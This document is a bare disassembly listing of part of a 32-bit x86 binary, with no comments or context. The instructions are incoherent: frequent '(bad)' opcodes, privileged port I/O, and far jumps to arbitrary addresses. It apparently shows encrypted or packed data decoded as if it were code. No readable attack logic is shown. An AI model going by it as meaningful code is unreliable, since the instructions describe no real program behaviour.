  402a26:	xor    eax,0xba832e2c
  402a2b:	mov    bl,0xd0
  402a2d:	push   edi
  402a2e:	imul   edx,edx,0x54
  402a31:	add    DWORD PTR ds:0xb6ea661a,ecx
  402a37:	inc    esi
  402a38:	fdiv   DWORD PTR [eax+ebp*2]
  402a3b:	adc    eax,0x4f382ffe
  402a40:	dec    ebp
  402a41:	in     eax,0x4
  402a43:	xor    eax,0xac87dff0
  402a48:	sahf   
  402a49:	add    al,0xc8
  402a4b:	pop    edi
  402a4c:	dec    esi
  402a4d:	jg     0x402a42
  402a4f:	mov    bh,0x3d
  402a51:	mov    ds:0x4afafaae,eax
  402a56:	and    DWORD PTR [edx],0x12
  402a59:	fidiv  WORD PTR [edi]
  402a5b:	mov    ebx,0x45b6e919
  402a60:	loope  0x402adb
  402a62:	(bad)  
  402a63:	sahf   
  402a64:	mov    esp,0xcfb7cfa2
  402a69:	imul   edi,esi,0xcb0cbfd5
  402a6f:	call   0x5bc80d70
  402a74:	rol    ebx,0x72
  402a77:	bound  eax,QWORD PTR [ebx+0x1e]
  402a7a:	xor    BYTE PTR [ecx+0x14],cl
  402a7d:	mov    esi,0xec89687a
  402a82:	loope  0x402ae0
  402a84:	out    dx,al
  402a85:	ror    bl,1
  402a87:	add    esi,DWORD PTR es:[ebp+0x500c2afd]
  402a8e:	fsub   DWORD PTR [ebp+0x19]
  402a91:	pop    eax
  402a92:	mov    ch,0xe1
  402a94:	sub    ch,ch
  402a96:	int3   
  402a97:	pop    edx
  402a98:	xchg   esp,eax
  402a99:	inc    ebp
  402a9a:	sti    
  402a9b:	sti    
  402a9c:	imul   BYTE PTR [edx]
  402a9e:	loopne 0x402aa5
  402aa0:	sbb    ch,dl
  402aa2:	fild   DWORD PTR [edi]
  402aa4:	ins    BYTE PTR es:[edi],dx
  402aa5:	mov    DWORD PTR [edi],0xb50745bd
  402aab:	daa    
  402aac:	fisttp DWORD PTR [edi+0x61]
  402aaf:	ds ins DWORD PTR es:[edi],dx
  402ab1:	push   esp
  402ab2:	jne    0x402a38
  402ab4:	popa   
  402ab5:	mov    dl,0x51
  402ab7:	mov    al,0x7e
  402ab9:	pop    esi
  402aba:	pop    edx
  402abb:	dec    edi
  402abc:	out    dx,al
  402abd:	lods   al,BYTE PTR cs:[esi]
  402abf:	pop    DWORD PTR [edi]
  402ac1:	retf   0xd3c6
  402ac4:	or     esp,edx
  402ac6:	fsubr  QWORD PTR [edx-0x33]
  402ac9:	enter  0xf569,0x73
  402acd:	ret    
  402ace:	sub    ch,BYTE PTR [ecx]
  402ad0:	xor    BYTE PTR [edi+0x3],ah
  402ad3:	aas    
  402ad4:	stc    
  402ad5:	js     0x402a66
  402ad7:	sbb    al,0xa0
  402ad9:	sub    ebx,DWORD PTR [esi+ecx*8+0x4f]
  402add:	dec    ebp
  402ade:	xor    DWORD PTR [esi+0x2d],esi
  402ae1:	rol    BYTE PTR [edi+ecx*8+0x25e54480],1
  402ae8:	xchg   ecx,eax
  402ae9:	or     DWORD PTR [edi+esi*8-0x4829ea79],edx
  402af0:	fwait
  402af1:	outs   dx,BYTE PTR ds:[esi]
  402af2:	cmp    ebp,esi
  402af4:	mov    WORD PTR [esi],ds
  402af6:	or     BYTE PTR [eax-0x38937ef6],ch
  402afc:	or     edx,DWORD PTR ds:0x6fb2bf09
  402b02:	repz ja 0x402aec
  402b05:	dec    ebx
  402b06:	xchg   esi,eax
  402b07:	rol    DWORD PTR [ecx+0x273839cf],1
  402b0d:	addr16 js 0x402acb
  402b10:	arpl   si,bx
  402b12:	mov    BYTE PTR [edx+0x60],al
  402b15:	cld    
  402b16:	imul   eax,DWORD PTR [ebp-0x3a8d3c44],0xf37e3dc4
  402b20:	mov    bh,0x12
  402b22:	jo     0x402b09
  402b24:	inc    edi
  402b25:	mov    BYTE PTR [ebp-0x20],ah
  402b28:	xor    bl,BYTE PTR [esi-0x73]
  402b2b:	pop    ebp
  402b2c:	in     eax,0x71
  402b2e:	es mov edx,0xe6bc8a6d
  402b34:	mov    edx,0xdacb647e
  402b39:	mov    BYTE PTR [esi-0x2a218acd],bl
  402b3f:	push   0x1edf107c
  402b44:	and    ecx,DWORD PTR [ebx]
  402b46:	addr16 jae 0x402b0d
  402b49:	cmp    eax,0xc5a14fb4
  402b4e:	or     eax,DWORD PTR [edx+0x7b]
  402b51:	mul    bh
  402b53:	mov    dh,0xee
  402b55:	inc    edi
  402b56:	push   0x985551f7
  402b5b:	push   sp
  402b5d:	sbb    DWORD PTR [ecx+eiz*1],esi
  402b60:	add    eax,0xb40676a5
  402b65:	jmp    0x402b97
  402b67:	fisub  DWORD PTR [edi]
  402b69:	out    0xa6,eax
  402b6b:	sub    eax,0x497986f2
  402b70:	xor    al,0x9c
  402b72:	jg     0x402bd1
  402b74:	jbe    0x402b9e
  402b76:	lea    edx,[eax]
  402b78:	cli    
  402b79:	jecxz  0x402b40
  402b7b:	retf   
  402b7c:	inc    edx
  402b7d:	mov    ebx,0xfe14e266
  402b82:	sub    DWORD PTR [edx+0x53f175d3],esp
  402b88:	xor    dl,BYTE PTR [edx]
  402b8a:	aas    
  402b8b:	ss pop ss
  402b8d:	xchg   DWORD PTR [ecx+0x5e477698],edx
  402b93:	or     eax,0x454820bc
  402b98:	fs jmp 0x60ece16a
  402b9e:	aas    
  402b9f:	cld    
  402ba0:	dec    eax
  402ba1:	sbb    bh,BYTE PTR [esi-0x61f2b7f4]
  402ba7:	loope  0x402b46
  402ba9:	adc    BYTE PTR [edi],bh
  402bab:	jmp    DWORD PTR [edx]
  402bad:	adc    esi,0xf360e0dc
  402bb3:	aad    0xe5
  402bb5:	(bad)  
  402bb7:	cmc    
  402bb8:	jo     0x402b55
  402bba:	into   
  402bbb:	dec    esi
  402bbc:	xchg   esp,eax
  402bbd:	fnsave [edi+0x11]
  402bc0:	fiadd  DWORD PTR [ebp+edi*2-0x4453033]
  402bc7:	pop    ebx
  402bc8:	jmp    0x402c1d
  402bca:	enter  0xe6a6,0x4a
  402bce:	adc    ebx,DWORD PTR [ecx-0x210a9cb3]
  402bd4:	dec    ebx
  402bd5:	dec    edx
  402bd6:	ret    0x8fd4
  402bd9:	fnstsw WORD PTR ds:0xb72eb79
  402bdf:	arpl   WORD PTR [edx],di
  402be1:	sbb    BYTE PTR [ebx-0x60ebdd5],cl
  402be7:	lock lock outs dx,DWORD PTR ds:[esi]
  402bea:	lock inc esi
  402bec:	xor    ah,BYTE PTR [ebx-0x62]
  402bef:	js     0x402c6c
  402bf1:	and    DWORD PTR [edx+0x7fbaf29e],0xffffffe5
  402bf8:	xor    eax,0x1840243b
  402bfd:	or     DWORD PTR [ecx],ecx
  402bff:	fwait
  402c00:	cs jmp 0x63c5:0xd0620fea
  402c08:	pop    ds
  402c09:	and    dh,BYTE PTR [ecx-0x5c87b45d]
  402c0f:	sbb    DWORD PTR [esi],ecx
  402c11:	retf   
  402c12:	scas   al,BYTE PTR es:[di]
  402c14:	je     0x402c26
  402c16:	pop    es
  402c17:	jp     0x402c7f
  402c19:	mov    edx,0x864c14d9
  402c1e:	cli    
  402c1f:	mov    ch,dh
  402c21:	push   ds
  402c22:	xchg   edx,eax
  402c23:	sbb    DWORD PTR [ebp+0x53bc3e67],esp
  402c29:	xchg   edx,eax
  402c2a:	(bad)  
  402c2b:	les    edx,FWORD PTR [ebx+0x19b8504c]
  402c31:	nop
  402c32:	adc    BYTE PTR [edx-0x6860e29b],ch
  402c38:	pop    edi
  402c39:	es pop ecx
  402c3b:	mov    ch,dh
  402c3d:	xchg   edx,eax
  402c3e:	shl    BYTE PTR [edi+esi*1+0x66c1629e],0x59
  402c46:	data16 lods al,BYTE PTR ds:[esi]
  402c48:	lock pop esp
  402c4a:	pop    eax
  402c4b:	sbb    al,0x15
  402c4d:	test   al,0x37
  402c4f:	enter  0x2ffb,0x6a
  402c53:	xchg   edx,eax
  402c54:	inc    edx
  402c55:	lds    ebp,FWORD PTR [esi+0x6e3d1c50]
  402c5b:	ret    
  402c5c:	jo     0x402c88
  402c5e:	mov    DWORD PTR [ebp-0x547a5f5e],esi
  402c64:	gs je  0x402caa
  402c67:	pop    ds
  402c68:	cvtdq2ps xmm3,xmm6
  402c6b:	arpl   WORD PTR [ebp-0x6],cx
  402c6e:	dec    ebp
  402c6f:	arpl   WORD PTR [ebx+edi*8],dx
  402c72:	in     al,0x64
  402c74:	mov    dl,0xa
  402c76:	xchg   BYTE PTR [ecx+0x58],bh
  402c79:	cmp    eax,0x5fc60406
  402c7e:	jmp    0xe1b380a5
  402c83:	jmp    0x9a485347
  402c88:	mov    dl,0x56
  402c8a:	xor    DWORD PTR [edx+ebp*1],edx
  402c8d:	out    dx,al
  402c8e:	inc    esp
  402c8f:	cli    
  402c90:	sbb    eax,0x209b52d8
  402c95:	aad    0xa5
  402c97:	sbb    DWORD PTR [eax-0x12],edx
  402c9a:	cdq    
  402c9b:	pop    esi
  402c9c:	jne    0x402c87
  402c9e:	xchg   ecx,eax
  402c9f:	or     eax,0xbbba810c
  402ca4:	and    al,0x3a
  402ca6:	mul    BYTE PTR [edi]
  402ca8:	shr    BYTE PTR ds:0x4976ec9d,cl
  402cae:	add    ch,BYTE PTR [ecx+0x4df7911d]
  402cb4:	or     bh,BYTE PTR [edx+0x11]
  402cb7:	imul   edx,DWORD PTR [edx],0xad079bb2
  402cbd:	int3   
  402cbe:	lea    eax,[edx+0x2b]
  402cc1:	ja     0x402c74
  402cc3:	dec    edx
  402cc4:	pop    ebp
  402cc5:	mov    cl,0xa6
  402cc7:	jb     0x402ceb
  402cc9:	mov    edi,0x13f1485b
  402cce:	call   0x43fd6356
  402cd3:	mov    ds:0x33e0add3,al
  402cd8:	ret    
  402cd9:	test   DWORD PTR [ebx+0x12973099],ebp
  402cdf:	push   ebp
  402ce0:	jae    0x402d49
  402ce2:	adc    ah,BYTE PTR [edx]
  402ce4:	xlat   BYTE PTR ds:[ebx]
  402ce5:	pushf  
  402ce6:	adc    al,BYTE PTR cs:[esi]
  402ce9:	psubw  mm1,QWORD PTR [eax]
  402cec:	stos   BYTE PTR es:[edi],al
  402ced:	inc    edx
  402cee:	adc    BYTE PTR [ebx-0x7e0fb882],bl
  402cf4:	xor    eax,0x538b2b90
  402cf9:	jle    0x402cf7
  402cfb:	in     eax,0x5f
  402cfd:	pop    ds
  402cfe:	ret    
  402cff:	jecxz  0x402d6e
  402d01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d02:	shl    edx,cl
  402d04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d05:	or     al,BYTE PTR ds:[ecx-0x4]
  402d09:	sahf   
  402d0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d0b:	pop    ecx
  402d0c:	add    esi,esi
  402d0e:	xchg   eax,eax
  402d10:	lock imul eax,DWORD PTR [edi],0x6
  402d14:	rcr    ecx,1
  402d16:	xor    al,0x67
  402d18:	xchg   ecx,eax
  402d19:	lods   al,BYTE PTR ds:[esi]
  402d1a:	add    eax,0x9ccb39b1
  402d1f:	mov    edi,0x90648d20
  402d24:	in     eax,0x9a
  402d26:	mov    eax,0xdb3f8482
  402d2b:	cmp    BYTE PTR [ebx-0xf30f31f],bh
  402d31:	dec    esp
  402d32:	mov    bl,0xc2
  402d34:	cli    
  402d35:	jmp    0x2b7b:0x5eaa5fc8
  402d3c:	popa   
  402d3d:	or     ah,BYTE PTR [eax-0x7]
  402d40:	push   esp
  402d41:	pop    ds
  402d42:	fwait
  402d43:	jg     0x402d72
  402d45:	sar    ecx,0x85
  402d48:	fs out 0x44,al
  402d4b:	retf   
  402d4c:	add    eax,0xcfaff363
  402d51:	pop    ss
  402d52:	mov    ds:0x7ace6919,al
  402d57:	cld    
  402d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d59:	sahf   
  402d5a:	adc    DWORD PTR [edi+0xd],edi
  402d5d:	sub    al,0x8a
  402d5f:	fisubr WORD PTR [ebx-0x3bf8d0b9]
  402d65:	pop    edi
  402d66:	shr    bh,cl
  402d68:	xlat   BYTE PTR ds:[ebx]
  402d69:	call   0xd59dec35
  402d6e:	cmp    dl,BYTE PTR [ebp+0x4cb96aa]
  402d74:	pushw  0x4f
  402d77:	retf   0xf842
  402d7a:	daa    
  402d7b:	in     al,0x81
  402d7d:	ret    0x518e
  402d80:	xchg   BYTE PTR [eax+eiz*4],bl
  402d83:	lods   eax,DWORD PTR ds:[esi]
  402d84:	dec    edx
  402d85:	mov    ds:0x13bc6d51,eax
  402d8a:	arpl   WORD PTR [si+0x39f2],dx
  402d8f:	gs jne 0x402dba
  402d92:	aas    
  402d93:	and    DWORD PTR [esi],edi
  402d95:	test   ah,cl
  402d97:	inc    ebp
  402d98:	push   edi
  402d99:	dec    esp
  402d9a:	stc    
  402d9b:	hlt    
  402d9c:	push   edi
  402d9d:	jg     0x402d91
  402d9f:	jl     0x402d6e
  402da1:	shr    DWORD PTR [edi],1
  402da3:	test   eax,0x9b6ab94f
  402da8:	jo     0x402d34
  402daa:	xor    bl,bl
  402dac:	pop    si
  402dae:	jb     0x402dce
  402db0:	mov    al,ds:0x35f802fe
  402db5:	or     BYTE PTR [edi+0x2b],dl
  402db8:	icebp  
  402db9:	cmc    
  402dba:	mov    cl,0x87
  402dbc:	mov    WORD PTR [edi],ss
  402dbe:	sahf   
  402dbf:	mov    al,ds:0x8518b570
  402dc4:	mov    ds:0x7bc43ba7,al
  402dc9:	pop    ebp
  402dca:	fwait
  402dcb:	or     BYTE PTR [ecx+esi*8-0x6d],ch
  402dcf:	xchg   ebx,eax
  402dd0:	cwde   
  402dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dd2:	inc    edx
  402dd3:	cmp    eax,DWORD PTR [ecx-0xd2ec6ff]
  402dd9:	mov    ds:0x6eb3a9ef,al
  402dde:	mov    ah,0xaa
  402de0:	out    0x6a,al
  402de2:	fs popf 
  402de4:	(bad)  [esi+0x7924d470]
  402dea:	stc    
  402deb:	jmp    0x402dc0
  402ded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dee:	or     DWORD PTR [edi],esp
  402df0:	push   0xffffffdc
  402df2:	and    DWORD PTR [edi+0x1b9e8e64],eax
  402df8:	into   
  402df9:	xchg   ecx,eax
  402dfa:	ins    DWORD PTR es:[edi],dx
  402dfb:	xor    bl,BYTE PTR [eax]
  402dfd:	fsub   st,st(2)
  402dff:	fild   QWORD PTR [ecx-0x16b66857]
  402e05:	push   eax
  402e06:	fisub  DWORD PTR [eax+0x68cf3c32]
  402e0c:	sbb    al,0x3e
  402e0e:	fs test edi,esi
  402e11:	push   edi
  402e12:	jmp    0x1ad724e2
  402e17:	(bad)  
  402e18:	iret   
  402e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e1a:	not    esi
  402e1c:	xor    DWORD PTR [ecx+0x558a3628],0x43
  402e23:	hlt    
  402e24:	aad    0xd4
  402e26:	jecxz  0x402dd9
  402e28:	aas    
  402e29:	stc    
  402e2a:	mov    ds:0xbdd38cb3,eax
  402e2f:	push   esp
  402e30:	lods   eax,DWORD PTR ds:[esi]
  402e31:	pop    ebx
  402e32:	cli    
  402e33:	mov    eax,ds:0x84e3e675
  402e38:	xchg   BYTE PTR [eax+0x42],ah
  402e3b:	loope  0x402df7
  402e3d:	(bad)  
  402e3e:	cmp    eax,DWORD PTR [ebx]
  402e40:	mov    bh,0x87
  402e42:	in     al,0xe6
  402e44:	sbb    eax,DWORD PTR [eax]
  402e46:	add    al,0x6e
  402e48:	lds    ecx,FWORD PTR [esi+0x56]
  402e4b:	imul   eax,DWORD PTR [edx],0xffffffa8
  402e4e:	pop    edx
  402e4f:	mov    edx,edx
  402e51:	dec    ebx
  402e52:	push   ecx
  402e53:	jmp    0x402e1e
  402e55:	stc    
  402e56:	out    0x8a,al
  402e58:	fnsave [edi]
  402e5a:	jmp    0x787b383f
  402e5f:	pop    ecx
  402e60:	add    BYTE PTR [eax],al
  402e62:	add    eax,0x2b7a90b
  402e67:	jbe    0x402eb3
  402e69:	fcmove st,st(5)
  402e6b:	das    
  402e6c:	hlt    
  402e6d:	dec    esp
  402e6e:	stos   DWORD PTR es:[edi],eax
  402e6f:	jmp    0xa9ba:0x51dccad0
  402e76:	dec    edi
  402e77:	ret    
  402e78:	out    0x99,eax
  402e7a:	mov    bh,dl
  402e7c:	mov    ebx,0xeadfea80
  402e81:	cmp    eax,0x75d45603
  402e86:	out    0x3c,eax
  402e88:	push   ss
  402e89:	jmp    0x66efa4ae
  402e8e:	jecxz  0x402e43
  402e90:	adc    al,0x37
  402e92:	and    edx,esp
  402e94:	pop    eax
  402e95:	(bad)  
  402e96:	dec    edi
  402e97:	pop    es
  402e98:	jmp    0x24ee:0x4f1479a8
  402e9f:	jg     0x402e39
  402ea1:	adc    ch,BYTE PTR [esi-0x25]
  402ea4:	test   al,0xd7
  402ea6:	dec    edi
  402ea7:	add    bl,al
  402ea9:	fs push 0x56278262
  402eaf:	xor    ebx,edi
  402eb1:	or     DWORD PTR [ecx],0x6009d814
  402eb7:	xchg   esp,eax
  402eb8:	xchg   ebp,eax
  402eb9:	push   edi
  402eba:	arpl   WORD PTR [ebx],di
  402ebc:	inc    esi
  402ebd:	mov    bh,0xd3
  402ebf:	lock push 0xa
  402ec2:	jno    0x402ead
  402ec4:	sbb    eax,0x1b13334b
  402ec9:	xlat   BYTE PTR ds:[ebx]
  402eca:	inc    ebp
  402ecb:	push   edx
  402ecc:	xor    DWORD PTR [esi+0x642701a3],esi
  402ed2:	mov    dl,0x1e
  402ed4:	jecxz  0x402e5a
  402ed6:	lock sub bh,BYTE PTR [ebx+0x2279d87f]
  402edd:	sbb    dh,BYTE PTR [ebx+0x4c]
  402ee0:	test   al,0xe2
  402ee2:	jns    0x402f54
  402ee4:	add    eax,0x946b5b0e
  402ee9:	out    dx,al
  402eea:	int    0x3
  402eec:	or     ah,cl
  402eee:	iret   
  402eef:	pusha  
  402ef0:	loopne 0x402f11
  402ef2:	xor    bl,al
  402ef4:	ins    BYTE PTR es:[edi],dx
  402ef5:	scas   eax,DWORD PTR es:[edi]
  402ef6:	push   0xc1de6d03
  402efb:	shr    esp,cl
  402efd:	xor    al,0xd1
  402eff:	push   es
  402f00:	shr    DWORD PTR [edi-0x77cd8ae5],0x8c
  402f07:	mov    al,0xa
  402f09:	pop    esp
  402f0a:	mov    esp,0xc4061a90
  402f0f:	or     esi,ebx
  402f11:	mov    esp,0xcc109943
  402f16:	aad    0x43
  402f18:	push   cs
  402f19:	fsub   st(5),st
  402f1b:	icebp  
  402f1c:	push   esp
  402f1d:	ret    0xc2ee
  402f20:	inc    edi
  402f21:	pop    es
  402f22:	fisttp DWORD PTR [ecx]
  402f24:	xor    BYTE PTR [ecx+0x2d1bbf5d],0x3a
  402f2b:	enter  0xc744,0xb9
  402f2f:	div    ebp
  402f31:	push   ecx
  402f32:	and    eax,esi
  402f34:	push   ds
  402f35:	repz jmp 0x5d03d9c9
  402f3b:	hlt    
  402f3c:	mov    ecx,0x86cb9d3d
  402f41:	iret   
  402f42:	in     ax,0xb4
  402f45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f46:	mov    esp,0xf8aa763a
  402f4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f4c:	xor    dl,BYTE PTR [esi-0x759cef32]
  402f52:	daa    
  402f53:	add    ch,BYTE PTR [esi]
  402f55:	retf   
  402f56:	aas    
  402f57:	jo     0x402fb0
  402f59:	pop    ds
  402f5a:	les    ebp,FWORD PTR [esi+ecx*1-0x65]
  402f5e:	aas    
  402f5f:	(bad)  
  402f60:	fnstsw WORD PTR [eax]
  402f62:	pop    ds
  402f63:	dec    esi
  402f64:	and    eax,0xba0d05b2
  402f69:	mov    ebx,0x3e178a09
  402f6e:	mov    dh,0x49
  402f70:	inc    ebp
  402f71:	ins    BYTE PTR es:[edi],dx
  402f72:	aad    0x9d
  402f74:	add    BYTE PTR [ebx+0x37],al
  402f77:	push   cs
  402f78:	lock jmp 0xcf5ae371
  402f7e:	test   BYTE PTR [ebp+0x48],ch
  402f81:	mov    ds:0xcc27c4d8,eax
  402f86:	jmp    0x9a50:0xc8c947c5
  402f8d:	push   eax
  402f8e:	xlat   BYTE PTR ds:[ebx]
  402f8f:	mov    ecx,DWORD PTR [ebx-0x7af8fdd3]
  402f95:	sbb    eax,0xffffffba
  402f98:	enter  0x6412,0x6e
  402f9c:	dec    BYTE PTR [ecx+0x71]
  402f9f:	gs xchg ebp,eax
  402fa1:	jge    0x402f7c
  402fa3:	imul   edi,DWORD PTR [edx+0x73],0x8b95506f
  402faa:	(bad)  
  402fab:	ret    
  402fac:	dec    esp
  402fad:	enter  0xab20,0x3b
  402fb1:	sbb    al,0x74
  402fb3:	push   esi
  402fb4:	mov    cl,0x9f
  402fb6:	pop    es
  402fb7:	js     0x402fe6
  402fb9:	sbb    esi,DWORD PTR [edi+0x7e]
  402fbc:	out    0xce,eax
  402fbe:	lds    edi,FWORD PTR [ebp-0x3d]
  402fc1:	xor    cl,BYTE PTR [ebx]
  402fc3:	icebp  
  402fc4:	jb     0x402fa3
  402fc6:	in     eax,0xd6
  402fc8:	popa   
  402fc9:	sbb    ebp,DWORD PTR [eax+0x76]
  402fcc:	jmp    0x402fd6
  402fce:	shr    dh,cl
  402fd0:	jg     0x402f5f
  402fd2:	mov    bl,0x16
  402fd4:	aas    
  402fd5:	pop    ss
  402fd6:	test   eax,0xd4747cb3
  402fdb:	push   0xffffff91
  402fdd:	inc    edi
  402fde:	stos   BYTE PTR es:[edi],al
  402fdf:	fidivr DWORD PTR [esi+eiz*2+0x324ee648]
  402fe6:	or     bl,BYTE PTR ds:0x8dc0023f
  402fec:	imul   ebp,DWORD PTR [esi+esi*2],0xeb3fe197
  402ff3:	jo     0x403009
  402ff5:	ror    BYTE PTR [ecx+0x49],cl
  402ff8:	(bad)  
  402ff9:	cs cmp dl,al
  402ffc:	(bad)  
  402ffd:	enter  0xecc3,0xbc
  403001:	je     0x403034
  403003:	lock ret 
  403005:	ficom  WORD PTR [ebx+edx*2-0x19719879]
  40300c:	in     al,dx
  40300d:	fwait
  40300e:	ret    
  40300f:	xlat   BYTE PTR ds:[ebx]
  403010:	(bad)  
  403011:	int    0x8e
  403013:	cmp    BYTE PTR [edx-0x31],ch
  403016:	mov    edi,edi
  403018:	cmp    bh,BYTE PTR [eax+0x3c]
  40301b:	dec    esp
  40301c:	rep outs dx,DWORD PTR ds:[esi]
  40301e:	or     cl,BYTE PTR [eax+0x114ada92]
  403024:	sar    ch,cl
  403026:	test   BYTE PTR [ebp+ebp*8+0x6a],ch
  40302a:	shrd   DWORD PTR [edi-0x627e7024],edx,cl
  403031:	and    bh,BYTE PTR [edx+0x62b77636]
  403037:	inc    ebx
  403038:	mov    ecx,ebp
  40303a:	pop    ss
  40303b:	and    esi,DWORD PTR [edx+0x5a07c49]
  403041:	push   edi
  403042:	es loop 0x4030b7
  403045:	enter  0xcfcb,0xd3
  403049:	mov    dl,BYTE PTR [ebp-0x7e]
  40304c:	add    BYTE PTR [ebx],ah
  40304e:	scas   al,BYTE PTR es:[edi]
  40304f:	xchg   ecx,eax
  403050:	mov    bl,0xb4
  403052:	add    DWORD PTR [ecx+ecx*4],edx
  403055:	retf   
  403056:	dec    edi
  403057:	rol    cl,cl
  403059:	lahf   
  40305a:	push   0xeef8a842
  40305f:	jno    0x4030b9
  403061:	xchg   edx,eax
  403062:	adc    edi,DWORD PTR [ecx+0x68f45477]
  403068:	inc    esi
  403069:	mov    cl,0x42
  40306b:	push   ebx
  40306c:	adc    esp,DWORD PTR [ebp-0x15]
  40306f:	jne    0x403090
  403071:	ins    BYTE PTR es:[edi],dx
  403072:	lods   eax,DWORD PTR ds:[esi]
  403073:	mov    ds:0x77b39743,al
  403078:	out    0xe,eax
  40307a:	inc    esi
  40307b:	pop    esi
  40307c:	icebp  
  40307d:	push   es
  40307e:	ins    DWORD PTR es:[edi],dx
  40307f:	and    edx,DWORD PTR [esi]
  403081:	add    ch,BYTE PTR [edx]
  403083:	jmp    FWORD PTR [edx+ebp*4-0x30]
  403087:	xor    ecx,edi
  403089:	inc    ecx
  40308a:	mov    ds:0x90cc3471,al
  40308f:	mov    edx,0xff0119ef
  403094:	and    eax,DWORD PTR ds:0xbc2a2d03
  40309a:	sub    BYTE PTR [esi-0x6e],bl
  40309d:	push   ebx
  40309e:	into   
  40309f:	aaa    
  4030a0:	je     0x40305b
  4030a2:	dec    ecx
  4030a3:	into   
  4030a4:	and    edx,edi
  4030a6:	sub    dl,dh
  4030a8:	xor    edx,DWORD PTR [ebx-0x374f5f80]
  4030ae:	lds    ebp,FWORD PTR [esp+ecx*4]
  4030b1:	pop    eax
  4030b2:	cdq    
  4030b3:	pop    eax
  4030b4:	jle    0x403041
  4030b6:	mov    esi,0x54522196
  4030bb:	outs   dx,BYTE PTR ds:[esi]
  4030bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030bd:	cmc    
  4030be:	(bad)  
  4030bf:	aas    
  4030c0:	or     eax,0xe58b89ba
  4030c5:	push   esp
  4030c6:	ins    BYTE PTR es:[edi],dx
  4030c7:	std    
  4030c8:	fidivr WORD PTR [edi]
  4030ca:	mov    dl,0xf
  4030cc:	call   0xaee1:0x906702f3
  4030d3:	adc    bh,dl
  4030d5:	pop    ss
  4030d6:	mov    bl,BYTE PTR [edi]
  4030d8:	out    dx,eax
  4030d9:	pop    ebp
  4030da:	lds    edx,FWORD PTR [ebx+0x1204a738]
  4030e0:	outs   dx,BYTE PTR ds:[esi]
  4030e1:	push   edx
  4030e2:	xchg   esp,eax
  4030e3:	stos   DWORD PTR es:[edi],eax
  4030e4:	cmp    eax,0xf3d3c4ec
  4030e9:	retf   0x4b39
  4030ec:	pop    edi
  4030ed:	mov    ds:0x73ea68e4,al
  4030f2:	pop    ss
  4030f3:	in     al,0xdc
  4030f5:	add    al,BYTE PTR [ecx]
  4030f7:	or     al,0xf9
  4030f9:	jmp    FWORD PTR [ecx-0x114dd84a]
  4030ff:	adc    dl,dl
  403101:	or     BYTE PTR [ebx-0x5f],al
  403104:	push   ss
  403105:	out    0x9a,al
  403107:	mov    ch,0x84
  403109:	dec    BYTE PTR [edi-0x7b]
  40310c:	or     DWORD PTR [edx+0x2ea2a0c6],edx
  403112:	and    al,0xc
  403114:	(bad)  
  403115:	in     eax,dx
  403116:	mov    eax,ds:0xac4a75ba
  40311b:	(bad)  [ebx+0x6fb2950f]
  403121:	ss push es
  403123:	loop   0x403165
  403125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403126:	jae    0x403156
  403128:	mov    eax,ds:0x7a245faf
  40312d:	popa   
  40312e:	sub    eax,0x914e6e39
  403133:	jns    0x4030fe
  403135:	cwde   
  403136:	and    esi,DWORD PTR [esi-0x789b52b3]
  40313c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40313d:	nop
  40313e:	aam    0x9e
  403140:	xchg   ebx,eax
  403141:	mov    al,ds:0x8bffc596
  403146:	call   0x5f2ef771
  40314b:	scas   al,BYTE PTR es:[edi]
  40314c:	or     edi,DWORD PTR [esi-0x22]
  40314f:	rcl    DWORD PTR [eax+edi*4],0x73
  403153:	add    BYTE PTR [esp+ecx*1-0x67],dl
  403157:	and    eax,0x4909eb36
  40315c:	push   ecx
  40315d:	mov    eax,0xae348706
  403162:	aaa    
  403163:	mov    eax,0x9f8075c8
  403168:	xor    BYTE PTR [ecx],cl
  40316a:	sbb    eax,0x418e147d
  40316f:	adc    eax,DWORD PTR [esi+ebx*8-0x7d]
  403173:	jg     0x4031d8
  403175:	adc    esi,DWORD PTR [edx]
  403177:	push   ecx
  403178:	sbb    al,0xfc
  40317a:	mov    ebx,0x2ab7e3fd
  40317f:	nop
  403180:	push   eax
  403181:	push   ss
  403182:	fmul   st,st(2)
  403184:	add    al,0x5e
  403186:	xchg   esp,eax
  403187:	and    DWORD PTR [edi+eiz*8+0x2e],0x27
  40318c:	les    edi,FWORD PTR [ebx+0xc]
  40318f:	in     eax,0x4
  403191:	cwde   
  403192:	mov    al,ds:0x328db672
  403197:	or     al,0xbb
  403199:	jbe    0x4031b2
  40319b:	pop    es
  40319c:	dec    edx
  40319d:	lods   al,BYTE PTR ds:[esi]
  40319e:	push   edx
  40319f:	inc    esi
  4031a0:	neg    dh
  4031a2:	mov    ebx,0x2cd4dfce
  4031a7:	push   esi
  4031a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031a9:	ucomiss xmm7,xmm6
  4031ac:	std    
  4031ad:	idiv   BYTE PTR [ebx+0x8]
  4031b0:	adc    ch,BYTE PTR [ebp+0x14]
  4031b3:	mov    ecx,0x671349a5
  4031b8:	imul   esp,DWORD PTR [esi],0x2b
  4031bb:	sub    bh,ch
  4031bd:	dec    esi
  4031be:	xlat   BYTE PTR ds:[ebx]
  4031bf:	xor    BYTE PTR [edx+eiz*1-0x23],dl
  4031c3:	push   edx
  4031c4:	mov    ecx,0x6c7c41a8
  4031c9:	xor    BYTE PTR [ebx-0x304e23e4],ch
  4031cf:	sbb    ch,BYTE PTR [ebx+0x4d]
  4031d2:	and    al,BYTE PTR [edi]
  4031d4:	pop    edi
  4031d5:	pop    eax
  4031d6:	mov    al,0x1d
  4031d8:	sti    
  4031d9:	xor    eax,0xcb3c7348
  4031de:	js     0x4031ae
  4031e0:	pushf  
  4031e1:	xor    DWORD PTR [eax+0xa7d227a],ebx
  4031e7:	inc    ecx
  4031e8:	sub    BYTE PTR [ebx+esi*2-0x36],ch
  4031ec:	dec    edi
